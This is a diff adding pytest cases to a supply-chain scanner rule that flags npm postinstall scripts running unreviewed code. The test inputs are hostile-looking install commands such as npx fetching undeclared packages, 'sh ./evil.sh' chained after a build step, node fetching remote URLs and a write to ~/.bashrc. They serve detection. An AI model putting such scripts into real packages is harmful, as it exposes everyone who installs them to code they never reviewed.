@@ -74,6 +74,77 @@ def test_dangerous_install_scripts(project_with_package_risks: Path) -> None:
     assert len(supply003) > 0, "Dangerous install scripts should be detected"
 
 
+# ---------------------------------------------------------------------------
+# AAK-SUPPLY-003 judges every command an install script runs
+# ---------------------------------------------------------------------------
+#
+# `npx` was on the safe list, so `npx some-remote-package`, which fetches a
+# package nothing declares and runs it during install, passed while the same
+# script under `bunx` was reported. Only the start of a script was judged, so
+# `tsc && sh ./evil.sh` passed, and `https` was not a network word, so
+# `node -e "require('https').get(...)"` passed.
+
+
+def _supply_003(tmp_path: Path, script: str, **deps: dict) -> list[str]:
+    package = {"name": "app", "version": "1.0.0", "scripts": {"postinstall": script}, **deps}
+    (tmp_path / "package.json").write_text(json.dumps(package))
+    return [f.evidence for f in scan(tmp_path)[0] if f.rule_id == "AAK-SUPPLY-003"]
+
+
+@pytest.mark.parametrize("script", [
+    "npx some-remote-package",
+    "npx --yes some-unreviewed-package",
+    "npx -y @scope/tool@1.2.3 setup",  # a pinned fetch is still a fetch
+    "bunx some-remote-package",
+    "pnpm dlx husky",  # dlx fetches whatever is installed
+    "node -e \"require('https').get('https://example.test/x')\"",
+    "node scripts/download.js https://example.test/bin.tgz",
+    "tsc && sh ./evil.sh",
+    "npm run build; sh ./evil.sh",
+    "tsc\nsh ./evil.sh",
+    "npx husky install && npx some-remote-package",
+    "node install.js || echo 'export X=1' >> ~/.bashrc",  # a fallback that writes a file
+])
+def test_supply_003_reports_a_script_that_runs_unreviewed_code(tmp_path: Path, script: str) -> None:
+    assert _supply_003(tmp_path, script, devDependencies={"husky": "^9.0.0"}) == [f"scripts.postinstall: {script}"]
+
+
+@pytest.mark.parametrize("script", [
+    "npx husky install",  # declared, so npx runs it from node_modules
+    "npx patch-package",
+    "bunx husky",
+    "npm exec -- patch-package",
+    "npx tsc -p .",  # a build tool on the safe list, as `tsc` alone is
+    "tsc && node scripts/postinstall.js",
+    "npm run build && npx patch-package",
+    "node install.js || true",  # a no-op fallback is not a command to judge
+    "node scripts/postinstall.js || echo 'Skipping postinstall'",
+    "npm run build && exit 0",
+    "node scripts/build.js > build.log 2>&1",  # a redirect target is not a command
+])
+def test_supply_003_passes_build_tools_and_declared_packages(tmp_path: Path, script: str) -> None:
+    deps = {"devDependencies": {"husky": "^9.0.0", "patch-package": "^8.0.0"}}
+    assert _supply_003(tmp_path, script, **deps) == []
+
+
+def test_supply_003_still_reports_a_command_off_the_safe_list(tmp_path: Path) -> None:
+    """Declaring a package makes npx run it locally; the bare command was, and
+    is, judged by the build-tool list alone."""
+    assert _supply_003(tmp_path, "husky install", devDependencies={"husky": "^9.0.0"})
+
+
+def test_supply_003_reports_a_script_too_long_to_judge(tmp_path: Path) -> None:
+    """The longest of 3,171 real install scripts was 578 characters. A script
+    over the limit is reported without being split, so a crafted one costs the
+    scan nothing: shell tokenizing a single long word grows with its square."""
+    import time
+
+    script = "tsc " + "a" * 2_000_000
+    started = time.perf_counter()
+    assert _supply_003(tmp_path, script) == [f"scripts.postinstall: {script}"]
+    assert time.perf_counter() - started < 5.0
+
+
 def test_no_lockfile(tmp_path: Path) -> None:
     """AAK-SUPPLY-004: Missing lockfile."""
     (tmp_path / "package.json").write_text('{"name":"test","version":"1.0.0"}')
